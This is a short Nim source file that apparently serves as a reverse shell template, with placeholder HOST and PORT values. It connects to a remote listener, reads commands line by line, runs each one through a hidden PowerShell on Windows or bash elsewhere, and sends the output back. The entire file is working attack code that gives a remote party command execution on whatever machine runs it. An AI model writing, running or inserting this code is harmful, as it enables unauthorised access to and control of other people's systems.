import net
import osproc
import strformat

# Create Socket
let port = PORT
let address = "HOST"
let sock = newSocket()

# Connect to listener
sock.connect(address, Port(port))


when defined windows:
  #Create Prompt
  let prompt = "PS> "
  while true:
      # Send prompt
      send(sock, prompt)

      # Receive Data
      # Run command
      let cmd = recvLine(sock)
      let output = 
          execProcess(fmt"powershell.exe -nop -w hidden -c {cmd}")
      send(sock, output)
else:
  #Create Prompt
  let prompt = "$ "
  while true:
      # Send prompt
      send(sock, prompt)

      # Receive Data
      # Run command
      let cmd = recvLine(sock)
      let output = 
          execProcess(fmt"/bin/bash -c '{cmd}'")
      send(sock, output)
